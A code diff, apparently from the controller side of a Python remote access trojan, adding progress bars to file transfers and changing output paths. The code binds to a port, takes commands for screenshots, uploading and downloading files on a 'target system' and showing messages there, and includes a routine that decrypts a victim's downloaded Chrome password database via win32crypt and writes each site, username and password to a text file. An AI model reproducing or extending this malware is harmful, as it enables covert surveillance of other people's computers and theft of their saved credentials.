@@ -22,12 +22,13 @@ if os.name == "nt": import win32crypt
 reload(sys)
 sys.setdefaultencoding("utf-8")
 
-green = Fore.GREEN
-yellow = Fore.YELLOW
-red = Fore.RED
-blue = Fore.CYAN
-white = Fore.WHITE
-bright = Style.BRIGHT
+red     = Fore.RED
+blue    = Fore.CYAN
+green   = Fore.GREEN
+white   = Fore.WHITE
+yellow  = Fore.YELLOW
+magenta = Fore.MAGENTA
+bright  = Style.BRIGHT
 
 startDir = os.getcwd()
 
@@ -39,11 +40,11 @@ def crypt(TEXT, encode=True):
 
 
 def help():
-    print bright + yellow + """
+    print bright + """
 Commands:
     help()                  : Show this message.
-    screenshot()            : Take a screenshot on client and send image file to server.
-    chrome_db               : Download Chrome's password database and decrypt it.
+    screenshot()            : Take a screenshot on client.
+    chrome_db               : Get Chrome's password decrypted database.
     download                : Download files from client.
     upload                  : Upload files to client from server.
     message TEXT            : Show messages on target system.
@@ -64,17 +65,31 @@ def send(data):
 
 def upload(command):
     fileName = command[len("upload "):]
+
+    print yellow + bright + "[*] Upload Started!"+"\n"
     try:
+        fileSize = int(int(os.path.getsize(fileName)) / 1024)
+        forBar = 0
+        barLen = 50.0
+
         f = open(fileName, 'rb')
         cli.sendall(crypt(command))
         l = f.read(1024)
 
         while l:
+            sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
+            sys.stdout.flush()
+            forBar += barLen / fileSize
+
+
             cli.send(l)
             l = f.read(1024)
+
+        #print bright + magenta + "\r[%s | 100%%]"%("="*50)
         f.close()
         cli.send(END_OF_FILE)
-        print bright + yellow + crypt(cli.recv(1024), False)+"\n"
+
+        print "\n" + bright + yellow + crypt(cli.recv(1024), False)
         menu()
 
     except IOError:
@@ -83,12 +98,20 @@ def upload(command):
 
 def download(command):
     cli.sendall(crypt(command))
+    
+    print yellow + bright + "[*] Download Started!\n"
+
+    fileSize = int(cli.recv(1024))
+
     if "screenshot" in command:
         fileName = str(command[len("screenshot() download "):])
         f = open(startDir+os.sep+"screenshots"+os.sep+fileName, 'wb')
     else:
         fileName = str(command[len("download "):])
         f = open(startDir+os.sep+"downloads"+os.sep+fileName, 'wb')
+
+    barLen = 50.0
+    forBar = 0
 
     while True:
         l = cli.recv(1024)
@@ -103,33 +126,44 @@ def download(command):
 
         else:
 
-	        while (l):
-	            if l.endswith(END_OF_FILE):
-	                if END_OF_FILE in l:
-	                    l = l.replace(END_OF_FILE, "")
-	                f.write(l)
-	                break
-	            else:
-	                f.write(l)
-	                l = cli.recv(1024)
+            while (l):
 
-                dir = "screenshots" if "screenshot" in command else "downloads"
-	        print bright + yellow + "[+] Download complete!"
-	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, startDir+os.sep+dir+os.sep+fileName)
-	        f.close()
-	        break
+                if l.endswith(END_OF_FILE):
+                    if END_OF_FILE in l:
+                        l = l.replace(END_OF_FILE, "")
+                    f.write(l)
+                    break
+
+                else:
+                        sys.stdout.write("\r"+ bright + magenta +"[%s%s | %d%%] "%('='*int(forBar), " "*int(barLen - forBar), int(forBar * 2)))
+                        sys.stdout.flush()
+
+                        f.write(l)
+                        l = cli.recv(1024)
+                        forBar += barLen / fileSize
+
+            print bright + magenta + "\r[%s | 100%%]"%("="*50)
+            print "\n" + bright + yellow + "[+] Download complete!"
+            print bright + yellow + "[+] %s ==> %s\n"%(fileName, f.name)
+            f.close()
+            break
+
 
 def decrypt_db():
     #https://github.com/D4Vinci/Chrome-Extractor/blob/master/Chromer.py
-    data="chrome_db"
-    connection = sqlite3.connect(data)
+
+    connection = sqlite3.connect(startDir+os.sep+"downloads"+os.sep+"chrome_db")
     print bright + blue + "[>] Connected to data base.."
+
     cursor = connection.cursor()
     cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-    final_data=cursor.fetchall()
+
+    final_data = cursor.fetchall()
     print bright + blue + "[>] Found "+str(len(final_data))+" password.."
-    a=open("chrome.txt","w")
+
+    a=open(startDir+os.sep+"downloads"+os.sep+"chrome_db.txt","w")
     a.write("Extracted chrome passwords :\n")
+
     for website_data in final_data:
         password = win32crypt.CryptUnprotectData(website_data[2], None, None, None, 0)[1]
         one="Website  : "+str(website_data[0])
@@ -137,8 +171,9 @@ def decrypt_db():
         three="Password : "+str(password)
         a.write(one+"\n"+two+"\n"+three)
         a.write("\n"+" == ==="*10+"\n")
+
     print bright + blue + "[>] Decrypted "+str(len(final_data))+" passwords.."
-    print bright + blue + "[>] Data written to chrome.txt\n"
+    print bright + blue + "[>] Data written to %s\n"%(a.name)
     a.close()
 
 
@@ -154,7 +189,7 @@ def bind(host, port):
     pwd = crypt(cli.recv(1024), False)
     hostname = crypt(cli.recv(1024), False)
 
-    print bright + Fore.MAGENTA + "[*] Connection from ==> %s:%s\n"%(addr[0], addr[1])
+    print bright + magenta + "[*] Connection from ==> %s:%s\n"%(addr[0], addr[1])
 
 def menu():
     while True:
